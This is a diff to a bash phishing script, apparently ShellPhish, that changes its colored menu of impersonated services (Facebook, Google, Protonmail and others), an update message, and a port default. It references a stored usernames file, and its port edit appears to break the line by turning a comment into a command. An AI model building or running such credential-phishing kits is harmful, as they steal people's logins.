@@ -101,8 +101,8 @@ printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\e[0m       
 printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m Yahoo\e[0m           \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;93m Custom\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m Linkedin\e[0m        \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;93m Run Setup for Termux\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Github\e[0m         \e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;93m Protonmail\e[0m      \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;93m Update Script\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Google\e[0m         \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;93m Wordpress\e[0m       \e[1;92m[\e[0m\e[1;77mCtrl + C\e[0m\e[1;92m]\e[0m\e[1;93m Exit\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;93m Microsoft\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Google\e[0m         \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;93m Wordpress\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;93m Microsoft\e[0m       \e[1;92m[\e[0m\e[1;77mCtrl + C\e[0m\e[1;92m]\e[0m\e[1;93m Exit\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;93m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;93m InstaFollowers\e[0m\n"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m' option
 
@@ -145,7 +145,6 @@ printf "\n\e[1;92mOkay ...\n\e[0m"
 fi
 server="facebook"
 start1
-
 elif [[ $option == 3 || $option == 03 ]]; then
 printf "\n\e[1;93mWhich you have?\e[0m\n"
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Linux for PC\e[0m          \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Termux for Android\e[0m          \e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Skip for now\e[0m"
@@ -521,7 +520,7 @@ elif [[ $option == 21 ]]; then
 clear
 printf "\n\e[1;92mRecommanded to copy your important codes and files ..."
 sleep 3
-printf "\n\e[1;91m Because this Update will erase \e[1;94mUserRecon\e[1;91m Directory and again download it via git ...\n\nYou can press Ctrl + C to Abort if you want ...\n"
+printf "\n\e[1;91m Because this Update will erase \e[1;94mShellPhish\e[1;91m Directory and again download it via git ...\n\nYou can press Ctrl + C to Abort if you want ...\n"
 sleep 5
 printf "Running \e[1;94mupdate.sh\e[0;92m Script ...\n"
 sleep 1.5
@@ -756,7 +755,7 @@ rm -rf sites/$server/usernames.txt
 
 fi
 
-default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
+default_port="3333" $(seq 1111 4444 | sort -R | head -n1)
 printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
 read port
 port="${port:-${default_port}}"
